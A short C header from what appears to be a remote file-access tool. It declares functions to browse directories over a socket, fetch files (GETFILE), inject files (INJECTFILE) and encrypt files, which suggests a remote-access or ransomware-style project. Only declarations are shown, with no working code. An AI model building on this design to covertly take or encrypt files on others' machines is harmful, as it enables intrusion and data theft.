#pragma once
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>

#include "../../common/socket.h"
#include "showAllFile.h"
#include "../encryption/fileEncryption.h"

typedef struct paramSurff{
	paramThread * paramT;
	DIR * dir;
	char pwd[2048];
	char input[MAX_PATH];
	char dir_name[MAX_PATH];
} paramSurf;

#ifdef _WIN32
    #include <direct.h>
#else
    #include <unistd.h>
#endif

void showMenu(void * paramS);
DWORD WINAPI surfMode(LPVOID param);
void showPWD(void * paramS);
void handleEncryption(void * paramS);

void GETFILE(void * paramS);

void INJECTFILE(void * paramS);
